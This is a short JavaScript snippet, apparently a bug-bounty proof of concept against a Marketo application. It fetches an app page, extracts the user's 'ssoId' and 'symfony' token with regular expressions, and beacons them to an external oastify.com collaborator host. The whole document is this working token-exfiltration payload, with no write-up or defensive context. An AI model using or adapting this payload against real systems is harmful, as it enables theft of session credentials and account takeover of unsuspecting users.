fetch('https://app-abdemo1.marketo.com/?meue&meueDataOnlyMode&meueAdminTreeEnabled&meueVisualCampaign')
  .then(response => response.text())
  .then(html => {
    const ssoIdRegex = /"ssoId"\s*:\s*"([^"]+)"/;
    const ssoIdMatch = html.match(ssoIdRegex);

    const symfonyRegex = /window\.Mkt3Config\s*=\s*{[^}]*"symfony"\s*:\s*"([^"]+)"/;
    const symfonyMatch = html.match(symfonyRegex);

    if (ssoIdMatch && ssoIdMatch[1] && symfonyMatch && symfonyMatch[1]) {
      const msg=`ssoId = ${ssoIdMatch[1]}\nsymfony = ${symfonyMatch[1]}`;
      navigator.sendBeacon("http://0depv8vbmosi3ij4vhnm2rd88zeq2lqa.oastify.com/",msg);
    } else {
      let errors = [];
      if (!ssoIdMatch || !ssoIdMatch[1]) errors.push('ssoId not found');
      if (!symfonyMatch || !symfonyMatch[1]) errors.push('symfony not found');
      alert(errors.join('\n'));
    }
  })
  .catch(error => {
    console.error('Error:', error);
    alert('Error: ' + error);
  });
